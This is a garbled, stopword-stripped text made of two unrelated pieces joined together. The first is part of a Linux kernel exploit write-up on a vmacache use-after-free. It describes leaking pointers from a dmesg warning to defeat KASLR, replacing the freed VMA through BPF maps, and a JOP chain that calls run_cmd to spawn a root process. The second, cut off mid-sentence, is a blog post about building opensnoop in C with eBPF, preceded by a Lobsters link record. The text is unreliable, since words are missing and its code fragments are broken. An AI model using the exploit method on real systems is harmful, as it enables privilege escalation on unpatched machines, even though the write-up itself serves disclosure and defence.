would probably able avoid using interface bugon warnononce dmesg function first useafterfree access occurs vmacachefind function first added bug introduced accessed vma cache follows vmacachesize struct vmareastruct vma current vmacache vma vma vmstart addr vma vmend addr bugon vma vmmm mm return vma code encountered cached vma whose bound contain supplied address addr checked whether vma vmmm pointer match expected mmstruct always case unless memory safety problem happened terminated bugon assertion failure bugon intended handle case kernel thread detects severe problem ca nt cleanly handled bailing current context default upstream kernel configuration bugon normally print backtrace register dump dmesg log buffer forcibly terminate current thread sometimes prevent rest system continuing work properly example crashing code held important lock thread attempt take lock deadlock often successful keeping rest system reasonably usable state kernel detects crash critical context interrupt handler brings whole system kernel panic handler code used dealing unexpected crash kernel code like page fault general protection fault nonwhitelisted address default possible kernel attempt terminate offending thread handling kernel crash tradeoff availability reliability security system owner might want system keep running long possible even part system crashing sudden kernel panic would cause data loss downtime important service similarly system owner might want debug kernel bug live system without external debugger whole system terminated soon bug triggered might harder debug issue properly hand attacker attempting exploit kernel bug might benefit ability retry attack multiple time without triggering system reboots attacker ability read crash log produced first attempt might even able use information sophisticated second attempt kernel provides two sysctls used adjust behavior depending desired tradeoff kernelpaniconoops automatically cause kernel panic bugon assertion trigger kernel crash initial value configured using build configuration variable configpaniconoops default upstream kernel enabling default distribution would probably bad idea eg enabled android kerneldmesgrestrict control whether nonroot user access dmesg log among thing contain register dump stack trace kernel crash initial value configured using build configuration variable configsecuritydmesgrestrict default upstream kernel enabled distribution eg debian android relies selinux block access dmesg ubuntu example enables neither code snippet amended month committed vmacachesize struct vmareastruct vma current vmacache vma vma vmstart addr vma vmend addr bugon vma vmmm mm vma continue warnononce vma vmmm mm break vma vmstart addr vma vmend addr return vma amended code distribution like ubuntu currently shipping first change sanity check dangling pointer happens address comparison second change somewhat interesting bugon replaced warnononce warnononce print debug information dmesg similar bugon would print difference bugon warnononce print debug information first time trigger execution continues kernel detects dangling pointer vma cache lookup fastpath word heuristically detects useafterfree happened bail fastpath fall back redblack tree walk process continues normally fit kernel policy attempting keep system running much possible default accidental useafterfree bug occurs reason kernel probably heuristically mitigate effect keep process working policy printing warning even kernel discovered memory corruption problematic system kernel panic kernel notice securityrelevant event like kernel memory corruption simply making warn trigger kernel panic nt really option warn also used various event important kernel security reason us warnon securityrelevant place replaced checkdatacorruption permit toggling behavior bug warn kernel configuration time however checkdatacorruption used linked list manipulation code addrlimitusercheck check vma cache example still us classic warnononce third important change made function however change relatively recent first kernel nt released yet irrelevant attacking currently deployed kernel vmacachesize struct vmareastruct vma current vmacachevmas struct vmareastruct vma current vmacachevmas idx vma continue warnononce vma vmmm mm break vma vmstart addr vma vmend addr countvmvmacacheevent vmacachefindhits return vma vma ifdef configdebugvmvmacache warnononce vma vmmm mm break endif vma vmstart addr vma vmend addr countvmvmacacheevent vmacachefindhits return vma idx vmacachesize idx change sanity check skipped altogether unless kernel built debugging option configdebugvmvmacache exploit incrementing sequence number exploit increment sequence number roughly time therefore efficiency primitive used increment sequence number important runtime whole exploit possible cause two sequence number increment per syscall follows create anonymous vma span three page repeatedly use mmap mapfixed replace middle page equivalent vma cause mmap first split vma three vmas replace middle vma merge three vmas together causing vma cache invalidation two vmas deleted merging vmas exploit replacing vma enumerating potential way attack useafterfree without releasing slab backing page according procslabinfo ubuntu kernel us one page per vmareastruct slab back buddy allocator page allocator get vmareastruct reused process process would able use vma nt result anything interesting since vma cache process would allowed contain pointer vma anyway free vmareastruct slab allocator freelist attempt access however least slub allocator ubuntu us replaces first byte vmareastruct contain vmstart userspace start address kernel address make impossible vma cache lookup function return since condition vma vmstart addr vma vmend addr ca nt fulfilled therefore nothing interesting happens free vmareastruct slab allocator freelist allocate another process would exception narrow race condition ca nt easily triggered repeatedly result hitting warnononce therefore vma cache lookup function would nt return vma free vmareastruct slab allocator freelist make allocation slab merged vmareastruct slab requires existence aliasing slab ubuntu vm slab seems exist therefore exploit bug necessary release backing page back page allocator reallocate page way permit placing controlled data various kernel interface could used example pipe page advantage wiped allocation advantage permit writing arbitrary inpage offset splice available advantage pagealigned disadvantage ca nt multiple writes without first freeing page reallocating bpf map exploit us bpf map exploit leaking pointer dmesg exploit want following information least ubuntu kernel first two directly visible register dump triggered warnononce therefore easily extracted dmesg mmstruct address rdi vma address rax however instruction pointer directly visible rip stack symbolized none generalpurpose register contain instruction pointer kernel backtrace contain multiple set register stack backtracing logic encounter interrupt frame generates another register dump since trigger warnononce page fault userspace address page fault userspace address happen userspace memory access syscall context via copyfromuser copytouser pick call site relevant information register wide range choice turn writing eventfd trigger usercopy still contains pointer eventfdfops structure exploit run replaces vma zeroed memory trigger vma lookup broken vma cache intentionally triggering warnononce generates warning look follows leak used exploit highlighted warning cpu pid rip rsp eflags rax rbx rcx rdx rsi rdi rbp f g c d e call trace rip rsp eflags rax rbx rcx rdx rsi rdi rbp rip rsp eflags origrax rax ffffffffffffffda rbx rcx rdx rsi rdi rbp code fa ce end trace point exploit create fake vma contains correct mmstruct pointer leaked rdi also populates field reference fake data structure creating pointer back fake vma using leaked vma pointer rax pointer kernel code using leaked page fault exception frame bypass kaslr exploit jop boring part probably possible exploit bug really elegant way abusing ability overlay fake writable vma existing readonly page something like however exploit us classic jumporiented programming trigger useafterfree second time writing memory access performed address pagetable entry point kernel page fault handler come via pagefault dopagefault dopagefault handlemmfault handlemmfault handleptefault dofault dosharedfault dofault point performs indirect call static int dofault struct vmfault vmf struct vmareastruct vma vmf vma int ret ret vma vmops fault vmf vma vma structure control point gain instruction pointer control contains pointer vma jop chain used follows quite crude example crash done job work first move vma pointer rdi mov rax qword ptr mov rax qword ptr test rax rax je ef mov rdi call get full control rdi fb mov rbx rdi mov rax qword ptr mov rdi qword ptr call point call runcmd spawn rootprivileged usermode helper using spacedelimited path argument list argument give u ability run binary supplied root privilege thanks mark pointing control rdi rip nt try crazy thing like flipping sm p bit spawn usermode helper launching usermode helper kernel crash page fault jop chain nt cleanly terminate however since kill process whose context fault occured nt really matter fix timeline bug reported two day later fix upstream kernel tree exceptionally fast compared fix time software vendor point downstream vendor could theoretically backport apply patch bug essentially public point even security impact obfuscated commit message frequently demonstrated grsecurity however fix upstream kernel automatically mean user system actually patched normal process shipping fix user use distribution kernel based upstream stable branch work roughly follows patch land upstream kernel patch backported upstreamsupported stable kernel distribution merges change upstreamsupported stable kernel kernel user install new distribution kernel note patch becomes public step potentially allowing attacker develop exploit user protected step case backport upstreamsupported stable kernel published five day patch became public point distribution could pull patch longterm maintenance kernel updated similarly frequently longterm maintenance kernel received update recent update previous one however linux distribution often nt publish distribution kernel update frequently example debian stable ship kernel based kernel last updated similarly ubuntu ship kernel last updated android ship security update month therefore securitycritical fix available upstream stable kernel still take week fix actually available user especially security impact announced publicly case security issue announced osssecurity mailing list cve allocation making need ship new distribution kernel user clearer still debian ubuntu release track bug unfixed conclusion exploit show much impact kernel configuration easy write exploit kernel bug simply turning every securityrelated kernel configuration option probably bad idea like kerneldmesgrestrict sysctl seem provide reasonable tradeoff enabled fix timeline show kernel approach handling severe security bug efficient quickly landing fix git master tree leaf window exposure time upstream fix published time fix actually becomes available user time window sufficiently large kernel exploit could written attacker meantime
272,Lobsters,debugging,Debugging,How I ended up writing opensnoop in pure C using eBPF,https://bolinfest.github.io/opensnoop-native/,ended writing opensnoop pure c using ebpf,ended writing opensnoop pure c using ebpf michael bolin september tl dr opensnoop c using ebpf eden http brendangreggcom linux performance part learning begin brendan diagram performance tool audit performance various part system utilitization saturation error use method linux solaris macos freebsd linux perf analysis opensnoop execsnoop iosnoop snoop sorta newsorta old technology linux seems little crazy build performant tracing tool linux ebpf map page appears aspire clearinghouse bpf reading material guide strace julia evans zines kernel hacker part initial foray ebpf rstrace http githubcombolinfestrustebpfdemo notified geoffroy fixed everything compile rust code unofficial ebpf spec updated readme linebyline annotation ebpf program per bpf calling convention position bpffuncid enum blog post gobpf slightly modified elfgo gobpf project part standalone ebpf program without libbpf http githubcomiovisorgobpftreemasterelf loading program section man page libbpfc endianness issue wrote python program dump ebpf bytecode c version program zeroed bpfattr writing discovered also check logbuf passed bpfprogload taken straight man page step system call read linux source code answer right code bcclinuxversioncode environment variable attaching kprobe implementation bpfattachkprobe libbpfc decided copy minimal subset libbpfc needed directly program attachkprobe function python wrapper single c file part standalone opensnoop using ebpf c version opensnoop bcc repo leveraged python binding libbpf main python file python code method name bpfcommonh another file bcc repo named bpfcommonh srcccapibpfcc srcccapibpftablecc generating bytecode dynamically generating c code bcc compile created working prototype approach tweeted brendan get thought python code postprocess bytecode placeholder argument python function python code also insert constant generated c code generated constant make possible caller create instruction array appropriate size compile time working bpf map definition macro promising line code bfrontendactioncc would call bpfcreatemap record resulting file descriptor field tabledesc visitor rewrote original call line opensnooppy exportedfilescc built bcc using llvm bpf elem function looked code helpersh value maxentries determined number possible cpu issue putting together small snippet python code end opensnooppy little openperfbuffer method next section struggle c fixed upstream deleted step moved definition common header file opensnooppy advanced programming unix environment edition eden raii folly file xkcd simple utility function bcc python binding part conclusion next step performance engineering tool ebpf ebpf improve fuse performance bit effort version linux kernel running android device set bpf feature supported kernel put final version code repo set repo submitting small patch rustbcc,ended writing opensnoop pure c using ebpf michael bolin september tl dr rewrote opensnoop c using ebpf story broke layer abstraction figure recently trying debug performance issue eden coworker started spitting thing try run vmstat check iostat ok mpstat etc know interpret output way ahead time unquestioningly typed command stared blankly output quietly nodding waiting coworker interpret number tell run next shortly thereafter asked playing frisbee quad day went linux performance tool school supposed learn stuff one book read learn need know many command need learn asked around friend told look http brendangreggcom learn performance engineering first visit brendan site pretty overwhelming long list article talk book course software clear brendan incredibly prolific conscientious sharing know everyone come learning computing performance found anything close second brendan web site begin linux performance page section talk organized n rough order recommended viewing difficulty intro advanced figured would start top work way list led interesting path learned number new topic challenged find answer question easily answered google stack overflow writing hope helpful teaching ebpf problem solving part learning begin started watching brendan video goal learning debug performance issue primarily linux historically deep stack colleague know thing work often eager read quality material help improve front also knew enough know lot tool passing familiarity small handful similar first overwhelmed learning git one first thought ok four five command need know get day suffice say bit overwhelmed first encountered brendan diagram performance tool audit performance various part system clear going shortcut watched video introduced utilitization saturation error use method methodology analyzing performance system general idea create map system dividing functional component resource examine one individually utilization saturation error idea examining component isolation find true bottleneck resource often tool checking vital sign end learn lot tool fortunately addition brendan comprehensive checklist various platform linux solaris macos freebsd mercifully put together simpler list u shorter attention span linux perf analysis top list command run command line seemed like good place start build basic competency branching unsurprisingly brendan created released number performance analysis tool one incredibly easy explain demo well frequently featured talk opensnoop tool print every open call system happens believe roughly equal strace p f e openat though opensnoop much much efficient also please run strace p command told may degrade sytem irreparably also case afraid open favored syscall status brendan also created execsnoop iosnoop others contributed snoop another topic come number brendan talk ebpf sorta newsorta old technology linux seems little crazy let upload code user space kernel run program every time designated code path kernel taken communicate program user space via file descriptor first read worked seemed crazy mind kernel sacred bastion need incredibly secure performant yet going let end user send whatever want run might expect send arbitrary code program written ebpf bytecode restricted instruction set also limit size program constraint ensure statically analyzable kernel verifies loop code terminate attache program specified codepath way imposes upper bound much drag ebpf program add system ebpf enables brendan build performant tracing tool linux case opensnoop register ebpf program attached open syscall log one ebpf map userland code able read write content ebpf map via file descriptor case opensnoop read data map format displayed user console although meant learn debugging performance issue ebpf stuff seemed pretty wild decided learn worked started reading article page appears aspire clearinghouse bpf reading material though save time guide one informationrich page found ebpf end google search learn thing like ebpf opensnoop course strace another name likely see julia evans like brendan produced tremendous amount great content particular zines quick read incredibly approachable though perhaps favorite thing kernel hacker talk showed create kernel module intercept open call system check specified path end open rick astley never gon na give instead brilliant point decided done enough highlevel background research time get mechanic stuff worked part initial foray ebpf spending bit time brendan julia material seemed like obvious question build version strace rust us ebpf read sounded like ebpf could help performance issue strace us ptrace hood also satisfying personal yet admittedly misguided desire replace c code rust whenever encounter gut feeling possible precompute ebpf bytecode new tracer written pure rust could start fast seemed like worthwhile project would give excuse get hand dirty ebpf could call rstrace suspected would original idea instead trying decided see someone else already done found handful projectsarticles related thought strange vltrace opensnoop example bcc crate chose compile ebpf bytecode c source fly number folk noted various article read required linking chunk llvm toolchain exercising runtime seemed inelegantheavyweight example geoffroy blog post unfortunately tool make tradeoff slightly annoying require installing bcc requires python llvm complete linux source target machine might possible precompile program though look like common use case bcc also thought strange various attribute geoffroy example used ensure code written specific section elf binary gut feeling accidental rather essential complexity wanted sure geoffroy article inline wanted contained lot useful exposition decided try understand detail wrote code although post contained bunch sample code initially turned contain numerous typo due html escaping error associated git repo clone reproduce result decided first order business would reproduce result blog post locally ultimately would make code available http githubcombolinfestrustebpfdemo notified geoffroy work typo fixed everything believe used different version rustc llvm geoffroy compile rust code version ebpf program instruction whereas assumed using newer version llvm toolchain improved optimization ebpf codegen wanted sure functionally equivalent end decided go assembly linebyline ensure understood everything spent lot time reading unofficial ebpf spec github learn different opcodes argument updated readme linebyline annotation ebpf program someone never bothered learn assembly quite tedious also enlightening knowledge would also prove helpful road ultimately discovered program pretty simple first writes c string hello rustn stack took two wide writes byte om rustn hello fr respectively plus write byte trailing c string address c string written length includes nul byte written appropriate argument bpftraceprintk written per bpf calling convention function corresponds number position bpffuncid enum called finally exit code written program exit reading bytecode geoffroy blog post appears writes hello stack one byte time explains take many instruction although explained ebpf program worked understanding run another matter geoffroy blog post mentioned blog post gobpf code could used run helloo elf binary indeed found code slightly modified run helloo successfully spent bit time looking elfgo gobpf project figured loaded data based elf section name make call function like bpfprogload still convinced packaging ebpf program way strictly necessary would try write standalone ebpf program find sure part standalone ebpf program without libbpf first thought write standalone c program would load run bpftraceprintk ebpf program geoffroy blog post figured would help answer question whether needed labeled elf section mentioned blog post whether would port bunch go code http githubcomiovisorgobpftreemasterelf rust build rstrace reading bpf thought program going simple implement assumed would define ebpf program array bpf bytecodes call bpf cmdbpfprogload attrtypebpfprogtypekprobe load ebpf program attach kprobe kprobe short kernel probe predefined location kernel ebpf program attached entry point system call assumption quite correct loading program first surprise despite include linuxbpfh bpf function call instead use syscall call bpf even though expected bpf function available since everything else ever looked section man page function name syscall nrbpf bpfprogload attr sizeof attr never used syscall figured needed looking source libbpfc would discover would use syscall program hypothesis c wrapper function bpf came along later could risk colliding userdefined function named bpf next step generate ebpf program produce array binary bytecodes expected array struct bpfinsn object honestly easier producing binary value worry endianness issue read using bcc wrote python program dump ebpf bytecode c version program print array struct bpfinsn object import struct bcc import argstring bpf define bpf program bpftext include uapilinuxptraceh include uapilinuxlimitsh include linuxschedh int traceentry struct ptregs ctx int dfd const char user filename bpftraceprintk hello rustn return def parseinstruction instruction opcode structunpack b instruction srcanddst structunpack b instruction loworder nibble dst dstreg srcanddst highorder nibble src srcreg srcanddst offset structunpack h instruction imm structunpack instruction return opcode dstreg srcreg offset imm bpfinsntemplate struct bpfinsn code x dstreg bpfreg srcreg bpfreg imm def printbpfinsnstruct bytecode print ebpf bytecode equivalent bpfinsn c print struct bpfinsn prog boffset xrange len bytecode instruction bytecode boffset boffset opcode dstreg srcreg offset imm parseinstruction instruction print bpfinsntemplate opcode dstreg srcreg offset imm print bpf bpf textbpftext bytecode bpfdumpfunc traceentry printbpfinsnstruct bytecode onetime conversion copied generated c code program incidentally bpfinsn first struct ever seen declared field nibble uninitiated nibble real term mean bit named half byte get declaration struct struct bpfinsn code opcode dest register source register signed offset imm signed immediate constant note second two field indicating field contributes bit maximum value unsigned bit binary decimal compiler complain try assign value greater either dstreg srcreg verify bit representation struct wrote small program include linuxbpfh include stdioh int main int argc char argv struct bpfinsn instruction struct bpfinsn code dstreg srcreg imm fwrite instruction sizeof instruction stdout compile run program system piping output xxd get feca om r see value struct written littleendian based way imm field serialized perhaps le obvious dstreg loworder nibble srcreg highorder nibble second byte written output incidentally limited nibble boundary declaring structs even requiring subbyte field type signedness discovered could also struct example char char struct example ex struct example fwrite ex sizeof ex stdout anyway back problem thing got interestingfrustrating call bpf failing einval sure could wrong relevant mention einval man page bpfprogload indicates attempt load invalid program ebpf program deemed invalid due unrecognized instruction use reserved field jump range infinite loop call unknown function tried running program gdb make sure value passing bpf expected discovered way calculated instruction count incorrect fixed looked libbpfc see implemented bpfprogload noticed zeroed bpfattr writing added code issue fixed still getting einval tried looking various place detailed error message ran dmesg tail nothing looking libbpfc discovered also check logbuf passed bpfprogload error message could printed also came empty pretty frustrated point implementation bpfprogload basically taken straight man page char bpflogbuf logbufsize int bpfprogload enum bpfprogtype type const struct bpfinsn insns int insncnt const char license union bpfattr attr progtype type insns insns insncnt insncnt license license logbuf bpflogbuf logsize logbufsize loglevel return bpf bpfprogload attr sizeof attr even though using gdb step system call one option find source einval read linux source code whatever reason never looked linux source code mostly gpl paranoia honest however answer right code plain day type bpfprogtypekprobe attr kernversion linuxversioncode return einval see sample implementation bpfprogload man page make mention kernversion though clearly linux kernel reject ebpf program einval progtypebpfprogtypekprobe kernversion linuxversioncode searched man page kernversion indeed note buried union bpfattr struct used bpfmapcreate maptype keysize size key byte valuesize size value byte maxentries maximum number entry map struct used bpfmap elem bpfmapgetnextkey command mapfd key union value nextkey flag struct used bpfprogload progtype insncnt insns const struct bpfinsn license const char loglevel verbosity level verifier logsize size user buffer logbuf user supplied char buffer kernversion checked progtypekprobe since linux attribute aligned added include linuxversionh top file set kernversion linuxversioncode bpfattr bpfprogload function succeeded said misgiving hardcoding linuxversioncode source meant could give binary version program someone slightly different version kernel version number machine would hardcoded binary causing version check machine different kernel fail thought would better calculate version number dynamically using uname however tried running following machine include linuxversionh include stdioh include stdlibh include stringh include sysutsnameh int main int argc char argv struct utsname buf uname buf perror error calling uname return printf utsnamerelease sn bufrelease int version atoi bufrelease char firstdot strstr bufrelease int patchlevel atoi firstdot char seconddot strstr firstdot int sublevel atoi seconddot printf linuxversioncode dn linuxversioncode printf kernelversion dn version patchlevel sublevel kernelversion version patchlevel sublevel return ran machine report run uname r got utsnamerelease linuxversioncode kernelversion word calculating linux version based uname yield number match linuxversioncode seemed would hardcode incidentally bcc appears support bcclinuxversioncode environment variable help believe would help unamelinuxversioncode mismatch seeing attaching kprobe unfortunately program actually anything needed attach kprobe took look implementation bpfattachkprobe libbpfc see going simple call bpf thought wanted avoid linking libbpf erroneously see next section thought would pull llvm decided copy minimal subset libbpfc needed directly program also lift code attachkprobe function python wrapper figure argument pas bpfattachkprobe c made typo process finally bright idea modify python program used generate ebpf bytecode attach kprobe bytecode bpfdumpfunc traceentry printbpfinsnstruct bytecode bpfattachkprobe event dosysopen fnname traceentry run strace output bcc thing found bpf call could attribute everything thereafter bpfattachkprobe call python code bpf bpfprogload progtypebpfprogtypekprobe license gpl openat atfdcwd sysbuseventsourcedeviceskprobetype ordonly enoent file directory openat atfdcwd sysbuseventsourcedeviceskprobeformatretprobe ordonly enoent file directory openat atfdcwd syskerneldebugtracingkprobeevents owronlyoappend getpid write p dosysopen close openat atfdcwd ordonly read close perfeventopen typeperftypetracepoint perfattrsize perfflagfdcloexec ioctl perfeventiocsetbpf ioctl perfeventiocenable ioctl perfeventiocdisable close openat atfdcwd syskerneldebugtracingkprobeevents ordonly getpid fstat read r dosysopennr dosysopennr dosysopennr dosysopennr dosysopennr read p dosysopennp dosysopennp dosysopennp dosysopennp dosysopennp kprobespdosysopenbc read p dosysopennr dosysopennp dosysopennr dosysopennp dosysopennr kprobesrdosysopenbc read p dosysopennr dosysopennp dosysopennr dosysopennp dosysopennr kprobesrdosysopenbc close openat atfdcwd syskerneldebugtracingkprobeevents owronlyoappend getpid write close felt little sheepish think trying earlier scroll far right first line see kernversion set bpfattr passed bpf might saved bunch time spent debugging bpfprogload could use strace see pythonbcc version program easy run c version program strace verify making syscalls moreover one notable advantage pure c version program strace output line compared line pythonbcc version making much easier read long last single c file ran equivalent geoffroy traceprintk demo time try something advanced part standalone opensnoop using ebpf c point believed rstrace possible going successful thought still needed learn bit code would trying generate rust end decided try create something little complex traceprintk example one talk believe brendan mentioned opensnoop one first performance tool writes new platform thought would try specifically would implement opensnoopc design goal previous program standalone executable load run ebpf without using bccllvm toolchain runtime would functionally equivalent version opensnoop bcc repo leveraged python binding would spend lot time original opensnooppy course project two new challenge creating opensnoop proved important opportunity learning time around parameterizing ebpf program based process id thread id appropriate using bpf map also felt copypasta ing code libbpfc done previous program bit gross include bcclibbpfh instead however wanted sure avoided pulling llvm toolchain final binary turned number incorrect assumption point worth explaining libbpf main way played bccbpf via python binding particular reading main python file spent lot time assumed every call method lib call method libbpf example saw call libbpfmodulecreatecfromstring python code method name bpfcommonh assumed libbpf included bpfcommonh meant depended llvm adding confusion another file bcc repo named bpfcommonh completely different api latter headeronly file defines bunch constant confused first started opensnoop instead taking bit libbpfc piecemeal decided take entirety copy transitive dependency see big surprised discover list file ultimately needed copy quite small srccccompatlinuxbpfh srccccompatlinuxbpfcommonh srccclibbpfh srccclibbpfc srcccperfreaderh srcccperfreaderc srcccsetnsh seemed weird srccc folder bcc repo giant libbpf tiny piece ran nm g confirm function like bpfmodulecreatecfromstring part libbpf quite bit digging new mental model code organized important breakthrough clarified difference libbcc currently srcccapibpfcc srcccapibpftablecc transitive dependency libbpf personally would love see repo reorganized code libbpf directory particular convinced could include bcclibbpfh standalone opensnoop without pulling llvm generating bytecode one brendan talk mentioned one nice thing python binding bcc allowed dynamically populate template c code bpf program runtime first watched talk idea important looking opensnooppy code could see appeal specifically opensnoop support p option filter event process id option filter event thread id although filtering could done user space much efficient check kernel space ie bpf program avoid writing unnecessary entry bpf map pidtid filter value known opensnoop runtime bpf program precompiled opensnoop work around dynamically generating c code bcc compile python based template parameterized p first glance seemed like could potentially undermine everything trying one prized design goal avoid using bcc runtime first potential workaround create static bpf program could read parameter runtime via bpf map created working prototype approach even tweeted brendan get thought main concern extra array lookup time kprobe called also felt bit inelegant decided try better next idea try create version program without filtering logic store array instruction c program user specified p could code inserted extra bytecodes array accommodate specified filter although think could made work think good approach general case inserting extra instruction arbitrary position could throw existing jump instruction also noticed perfeventopen pidt pid parameter thought could use take care filtering pid tried hardcoding value specific process machine intended effect noticed attachkprobe bcc python binding hardcodes call libbpf whereas attachuprobe pid parameter pass libbpf perhaps ignored kprobes three version filter decided use bcc create three version kprobe program one filtering one included event one included event chose canned filter value unlikely appear imm value generated bytecode next wrote python code postprocess bytecode generating c function would write appropriate array bpfinsn value struct bpfinsn passed function key trick python code generate c code would take original bytecode well placeholder argument example generating c function filter pid placeholder argument python function paramtype int paramname pid imm mean python code iterating bytecode find instruction imm equal instead hardcoding value imm corresponding struct bpfinsn specify variable pid instead also function prototype generated c function include int pid parameter function prototype c function generate corresponding bpf program follows int param explained next section void generatetraceentry struct bpfinsn instruction int void generatetraceentrytid struct bpfinsn instruction int tid int void generatetraceentrypid struct bpfinsn instruction int pid int python code also insert constant generated c code define maxnumtraceentryinstructions define numtraceentryinstructions define numtraceentrytidinstructions define numtraceentrypidinstructions define numtracereturninstructions generated function writes bpf program instruction generated constant make possible caller create instruction array appropriate size compile time version program support filtering take tid pid parameter appropriate use set imm necessary place generated bpf program although still generating bpf program template dynamically runtime using bcc runtime needed build time generating c code one thing thought interesting compiling different version program get best version scenario surprised see pid tid version program different length generatetraceentry generates program instruction generatetraceentrytid generates program instruction generatetraceentrypid generates program instruction turn slightly work calculate pid tid calculating pid requires bit shift parameterization problem solved ready solve mystery wire bpf map working bpf map perhaps biggest challenge whole process figuring bcc transformed logic c code bpf map ebpf bytecode specifically figuring associate declaration bpf map use bpfperfoutput event int tracereturn struct ptregs ctx struct datat data eventsperfsubmit ctx data sizeof data looking code first question bpfperfoutput macro creates object named event perfsubmit method called tracereturn look definition macro appears expand struct eventstablet int key leaf mapperfsubmit ctx data datasize int perfsubmit void void int perfsubmitskb void void maxentries attribute section mapsperfoutput struct eventstablet event maxentries ok bpfperfoutput event side effect declaring new struct type eventstablet creating instance named event also attribute thing ensure event get special annotation resulting binary though still trying understand whether annotation strictly necessary particular see anything would result bpf bpfmapcreate maptypebpfmaptypeperfeventarray syscall could see ran opensnoopypy strace much else look decided try figure attribute stuff bcc repo search mapsperfoutput matched promising line code bfrontendactioncc discovered visitor would examine section attribute perform action based content case would call bpfcreatemap record resulting file descriptor field tabledesc discovered bpf map generally referred table bcc codebase also file found logic explained perfsubmit method came visitor rewrote original call bpfperfeventoutput ctx bpfpseudofd curcpuidentifier data sizeof data perfsubmit method become pure function though led new question bpfpseudofd fortunately somewhere around discovered various way dump debugging info using python binding example changed line opensnooppy following bcc import debugpreprocessor b bpf textbpftext debugdebugpreprocessor import sys sysexit running sudo toolsopensnooppy got running kernel directory clang triple emitllvmbc emitllvmuselists disablefree disablellvmverifier discardvaluenames mainfilename mainc mrelocationmodel static mthreadmodel posix fmatherrno masmverbose mconstructoraliases fuseinitarray targetcpu dwarfcolumninfo debuggertuninggdb momitleafframepointer coveragenotesfile nostdsysteminc nobuiltininc resourcedir isystem virtuallibclanginclude include includelinuxkconfigh include virtualincludebccbpfh include virtualincludebcchelpersh isystem virtualinclude homembolincodebcc bpftracing include includeuapi includegenerateduapi kernel wnodeprecateddeclarations wnognuvariablesizedtypenotatend wnopragmaonceoutsideheader wnoaddressofpackedmember wnounknownwarningoption wnounusedvalue wnopointersign fdebugcompilationdir ferrorlimit fmessagelength fobjcruntimegcc fdiagnosticsshowoption vectorizeloops vectorizeslp mainbc x c virtualmainc faddrsig defined bpflicense error bpflicense specified cflags endif defined configccstackprotector defined configccstackprotectorauto defined configccstackprotectorregular defined configccstackprotectorstrong define configccstackprotector endif endif include uapilinuxptraceh include uapilinuxlimitsh include linuxschedh struct valt id char comm taskcommlen const char fname struct datat id t int ret char comm taskcommlen char fname namemax bpfhash infotmp struct valt bpfperfoutput event attribute section bpffntraceentry int traceentry struct ptregs ctx int dfd ctx di const char user filename ctx si struct valt val id bpfgetcurrentpidtgid pid id pid higher part tid id cast get lower part bpfgetcurrentcomm valcomm sizeof valcomm valid id valfname filename bpfmapupdateelem void bpfpseudofd id val bpfany return attribute section bpffntracereturn int tracereturn struct ptregs ctx id bpfgetcurrentpidtgid struct valt valp struct datat data tsp bpfktimegetns valp bpfmaplookupelem void bpfpseudofd id valp missed entry return bpfproberead datacomm sizeof datacomm valp comm bpfproberead datafname sizeof datafname void valp fname dataid valp id datats tsp dataret ptregsrc ctx bpfperfeventoutput ctx bpfpseudofd curcpuidentifier data sizeof data bpfmapdeleteelem void bpfpseudofd id return include bccfooterh appear first line long clang command run followed c code passed bpf constructor rewritten preprocessor note clang invocation contains argument include virtualincludebccbpfh include virtualincludebcchelpersh isystem virtualinclude bit confused path starting virtual exist machine could copypaste clang command run command line however found exportedfilescc file bcc repo appears provide inmemory mapping nonexistent file llvm us compilation looking preprocessed source code see operation map replaced call bpfmapupdateelem bpfmaplookupelem bpfperfeventoutput bpfmapdeleteelem understanding translation helped remove abstraction highlevel bcc toolkit lowlevel understanding sought trying debug option bpf unlocked information specifically tried using debugsource instead debugpreprocessor ran opensnooppy got disassembly section bpffntraceentry traceentry line int dfd ctx di const char user filename ctx si line struct valt val line ff ff ff ff id bpfgetcurrentpidtgid line call bf ff struct valt val line bf ff ff ff bpfgetcurrentcomm valcomm sizeof valcomm line call goto valfname filename line ff valid id line ff bpfmapupdateelem void bpfpseudofd id val bpfany line ldpseudo bf valfname filename line ff ff ff bf ff ff ff bpfmapupdateelem void bpfpseudofd id val bpfany line call return line exit disassembly section bpffntracereturn tracereturn line bf id bpfgetcurrentpidtgid line call ff struct datat data line ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff fe fe fe fe fe fe tsp bpfktimegetns line call bf valp bpfmaplookupelem void bpfpseudofd id line ldpseudo bf int tracereturn struct ptregs ctx line ff ff ff valp bpfmaplookupelem void bpfpseudofd id line call bf valp line goto bpfproberead datacomm sizeof datacomm valp comm line bf bf fe ff ff call bpfproberead datafname sizeof datafname void valp fname line bf fe ff ff ff call dataid valp id line datats tsp line fe dataid valp id line fe dataret ptregsrc ctx line fe bpfperfeventoutput ctx bpfpseudofd curcpuidentifier data sizeof data line ldpseudo bf bpfproberead datacomm sizeof datacomm valp comm line fe ff ff bpfperfeventoutput ctx bpfpseudofd curcpuidentifier data sizeof data line bf ff ff ff ff call bpfmapdeleteelem void bpfpseudofd id line ldpseudo bf bpfproberead datacomm sizeof datacomm valp comm line ff ff ff bpfmapdeleteelem void bpfpseudofd id line call line exit great provided output analogous llvmobjdump provided geoffrey blog post incidentally built bcc using llvm point built llvm sure debugsource output rich earlier version llvm could explain get different result try reproduce reference output bpfpseudofd ldpseudo understand grepping term bcc codebase revealed little looking bpf elem function declared libbpfh first parameter int fd based output debugdebugpreprocessor occurred void bpfpseudofd would return file descriptor infotmp map somewhere around dawned stdinstdoutstderr fds respectively must logic inferensure fds infotmpevents must respectively tried swapping order bpf map declaration opensnooppy verified file descriptor swapped accordingly getting somewhere realized use bpfcreatemap libbpfh create map get file descriptor figure value pas looked code helpersh determined appropriate default value maxentries bpfhash confirmed value actually used running strace opensnooppy though event maxentries according strace looked code bfrontendactioncc discovered value maxentries determined number possible cpu runtime good reminder look source well strace avoid simply hardcoding observed value thought bit weird instruction annotated ldpseudo debug output corresponded thing like instruction struct bpfinsn code dstreg srcreg imm srcreg specified value come imm seemed superfluous tried changing srcreg instead however tried loading program got following error typeinv expectedmapptr idea meant googled found issue filed bcc brendan least felt good company eventually deduced loading value srcreg must set value loaded tagged mapptr ie file descriptor bpf map rather arbitrary value necessary satisfy bpf program verifier newfound knowledge realized every bytecode would rewritten take imm parameter generated c function updated python logic responsible generating generatetraceentry friend would put imm value used ldpseudo set would used determine additional parameter add function prototype code create bpf map load bpf program appropriate file descriptor map putting together thought done point turned wrong small snippet python code end opensnooppy would turn lot work port c loop callback printevent b event openperfbuffer printevent starttime datetimenow argsduration datetimenow starttime argsduration bperfbufferpoll point would begin 